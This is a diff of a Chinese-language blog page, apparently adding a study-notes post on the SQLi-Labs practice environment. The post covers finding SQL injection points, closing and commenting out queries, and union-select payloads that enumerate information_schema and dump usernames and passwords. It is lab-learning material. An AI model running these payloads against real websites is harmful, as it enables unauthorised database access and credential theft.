@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="CTF,SQL注入," />
 
 
 
@@ -86,16 +86,27 @@
 
 
 
-<meta name="description" content="活到老，学到老，一直老到死不了。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="tags">
-<meta property="og:url" content="http://ug1y.github.io/tags/index-1.html">
+<meta name="description" content="第一课：判断注入点Less-1中通过输入参数?id=1能够看到获取的用户名密码的内容，改变id的值可以看到不同的用户名密码，在后端的实际查询如下：select * from TABLE where id=1;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi Labs 学习笔记 Part 2">
+<meta property="og:url" content="http://ug1y.github.io/2016/09/03/SQLi-Labs-学习笔记-Part-2/index.html">
 <meta property="og:site_name" content="ugly's Notes">
-<meta property="og:description" content="活到老，学到老，一直老到死不了。">
-<meta property="og:updated_time" content="2016-08-22T13:27:01.557Z">
+<meta property="og:description" content="第一课：判断注入点Less-1中通过输入参数?id=1能够看到获取的用户名密码的内容，改变id的值可以看到不同的用户名密码，在后端的实际查询如下：select * from TABLE where id=1;">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903123834.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903131801.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903131016.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903215717.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903220456.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903220951.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903221300.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903221831.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903222700.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903223146.png">
+<meta property="og:updated_time" content="2016-09-03T14:38:41.154Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="tags">
-<meta name="twitter:description" content="活到老，学到老，一直老到死不了。">
+<meta name="twitter:title" content="SQLi Labs 学习笔记 Part 2">
+<meta name="twitter:description" content="第一课：判断注入点Less-1中通过输入参数?id=1能够看到获取的用户名密码的内容，改变id的值可以看到不同的用户名密码，在后端的实际查询如下：select * from TABLE where id=1;">
+<meta name="twitter:image" content="http://ug1y.github.io/images/sqli-20160903123834.png">
 
 
 
@@ -116,15 +127,9 @@
 
 
 
-  <link rel="canonical" href="http://ug1y.github.io/tags/index-1.html"/>
+  <link rel="canonical" href="http://ug1y.github.io/2016/09/03/SQLi-Labs-学习笔记-Part-2/"/>
 
-  <title>
-  
-
-  
-    tags | ugly's Notes
-  
-</title>
+  <title> SQLi Labs 学习笔记 Part 2 | ugly's Notes </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -155,7 +160,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left  ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -278,9 +283,196 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
     
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                SQLi Labs 学习笔记 Part 2
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-09-03T12:27:10+08:00" content="2016-09-03">
+              2016-09-03
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/SQL注入/SQLi-Labs/" itemprop="url" rel="index">
+                    <span itemprop="name">SQLi Labs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/09/03/SQLi-Labs-学习笔记-Part-2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/03/SQLi-Labs-学习笔记-Part-2/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
       
-    
+      
+
+      
+        <h1 id="第一课：判断注入点"><a href="#第一课：判断注入点" class="headerlink" title="第一课：判断注入点"></a>第一课：判断注入点</h1><p>Less-1中通过输入参数<code>?id=1</code>能够看到获取的用户名密码的内容，改变id的值可以看到不同的用户名密码，在后端的实际查询如下：<br><code>select * from TABLE where id=1;</code><br><a id="more"></a></p>
+<p>我们输入一些特殊符号，让其产生错误，如单引号‘’’，双引号‘“’，反斜杠‘\’等，我们构造参数<code>id=1\</code>,产生错误如下：<br><img src="/images/sqli-20160903123834.png" alt=""></p>
+<p>可以知道输入的参数<code>$id</code>是被单引号包裹的，于是可以猜测其sql语句为：<br><code>$sql=&quot;select * from users where id=&#39;$id&#39; limit 0,1&quot;;</code></p>
+<p>于是我们可以闭包前面的语句同时注释后面的语句来构造正确的查询。</p>
+<ul>
+<li><code>?id=1&#39;--+</code> //‘+’在浏览器url中会被解析成空格</li>
+<li><code>?id=1&#39;%23</code> //‘%23’是‘#’的URL编码，用于注释后面的语句</li>
+</ul>
+<p>通过条件注入使得sql语句中where条件恒为真即达到目的。</p>
+<ul>
+<li><code>&#39; or &#39;1&#39;=&#39;1</code></li>
+<li><code>&#39; or 1 --+</code></li>
+<li><code>&#39; or 1 %23</code></li>
+</ul>
+<p>以上的注入会让sql查询等同于<code>select * from users</code></p>
+<h1 id="第二课：基本的注入获取全局信息"><a href="#第二课：基本的注入获取全局信息" class="headerlink" title="第二课：基本的注入获取全局信息"></a>第二课：基本的注入获取全局信息</h1><p>从上节课能够知道，通过输入特殊字符使得报错，能够得知注入的构造方法，用or语句使得条件永为真。同样在Less-2、Less-3、Less-4我们去尝试构造得到如下结果：</p>
+<ul>
+<li>Less-2: <code>1 --+</code></li>
+<li>Less-3: <code>1&#39;) --+</code></li>
+<li>Less-4: <code>1&quot;) --+</code></li>
+</ul>
+<p>这意味着我们在<strong>注释语句</strong>和<strong>闭合语句</strong>之间可以加入任何我们想执行的恶意注入代码。</p>
+<p>开始注入第一步，猜测sql查询的行数，在Less-1中构造注入<code>1&#39; order by 1--+</code>，按照第1行来排序，一直加，直到报错为止。发现当构造注入代码<code>1&#39; order by 4--+</code>时，出现错误，则说明总共查询有三行。<br><img src="/images/sqli-20160903131801.png" alt=""></p>
+<p>接下来我们用联合查询，构造<code>1&#39; union select 1,2,3--+</code>，但是什么也没有发生，这是由于联合查询将查询结果直接添加到数组后面，然而我们页面只显示了第一行，所以我们将构造改成<code>999&#39; union select 1,2,3--+</code>得到如下：<br><img src="/images/sqli-20160903131016.png" alt=""></p>
+<p>接下来，根据其显示输出的位置，我们构造注入代码添加想要查看的一些信息</p>
+<ul>
+<li><code>-1&#39; union select 1,version(),3--+</code> //查看数据库版本</li>
+<li><code>-1&#39; union select 1,database(),3--+</code> //查看当前数据库名</li>
+<li><code>-1&#39; union select 1,user(),3--+</code> //查看当前用户</li>
+<li><code>-1&#39; union select 1,@@datadir,3--+</code> //查看全局变量，数据存储目录</li>
+</ul>
+<h1 id="第三课：构造注入获取数据库或表内容"><a href="#第三课：构造注入获取数据库或表内容" class="headerlink" title="第三课：构造注入获取数据库或表内容"></a>第三课：构造注入获取数据库或表内容</h1><p>MYSQL的数据库中有一个自带的数据库information_schema，它提供了访问数据库元数据的方式。元数据就是对数据的描述，如数据库名或表名，列的数据类型，或访问权限等。普通的用户一般来说是可以有select等权限查看里面的内容。其中tables、columns等表存储着一些重要的信息。<br><img src="/images/sqli-20160903215717.png" alt=""></p>
+<p>接下来，我们构造一些注入来获取一些有用的信息。<br><code>-1&#39; union select 1,database(),3--+</code><br><img src="/images/sqli-20160903220456.png" alt=""></p>
+<p>得知当前数据库是<code>security</code>，利用元数据中的<code>tables</code>表来获取当前数据中有哪些表。<br><code>-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="/images/sqli-20160903220951.png" alt=""></p>
+<p>同样，用函数<code>database()</code>替换字符串<code>security</code>也能达到同样的效果。另外，可以使用<code>limit</code>关键字来指定获取第几行的数据，第一个参数是行数，第二个参数是偏移量。<br><code>-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1--+</code><br><img src="/images/sqli-20160903221300.png" alt=""></p>
+<p>如果想要一次全显示出来，可以用函数<code>group_concat</code>字符串组拼接。<br><code>-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</code><br><img src="/images/sqli-20160903221831.png" alt=""></p>
+<p>还可以利用这种方法获取表的字段信息，例如<code>users</code>表包含哪些字段，其他的表也一样。<br><code>-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code><br><img src="/images/sqli-20160903222700.png" alt=""></p>
+<p>最后，如果要导出表内容，通过以上获取的表名及其相应的字段信息，直接构造sql查询即可。<br><code>-1&#39; union select 1,group_concat(username),group_concat(password) from users--+</code><br><img src="/images/sqli-20160903223146.png" alt=""></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag">#CTF</a>
+          
+            <a href="/tags/SQL注入/" rel="tag">#SQL注入</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/09/03/SQLi-Labs-学习笔记-Part-1/" rel="next" title="SQLi Labs 学习笔记 Part 1">
+                <i class="fa fa-chevron-left"></i> SQLi Labs 学习笔记 Part 1
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -294,8 +486,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="tags/index-1.html"
-           data-title="tags" data-url="http://ug1y.github.io/tags/index-1.html">
+      <div class="ds-thread" data-thread-key="2016/09/03/SQLi-Labs-学习笔记-Part-2/"
+           data-title="SQLi Labs 学习笔记 Part 2" data-url="http://ug1y.github.io/2016/09/03/SQLi-Labs-学习笔记-Part-2/">
       </div>
     
   </div>
@@ -319,8 +511,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+      <section class="site-overview sidebar-panel ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
@@ -411,6 +612,17 @@
 
       </section>
 
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第一课：判断注入点"><span class="nav-number">1.</span> <span class="nav-text">第一课：判断注入点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二课：基本的注入获取全局信息"><span class="nav-number">2.</span> <span class="nav-text">第二课：基本的注入获取全局信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第三课：构造注入获取数据库或表内容"><span class="nav-number">3.</span> <span class="nav-text">第三课：构造注入获取数据库或表内容</span></a></li></ol></div>
+            
+          </div>
+        </section>
       
 
     </div>
@@ -507,6 +719,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
 
   
 
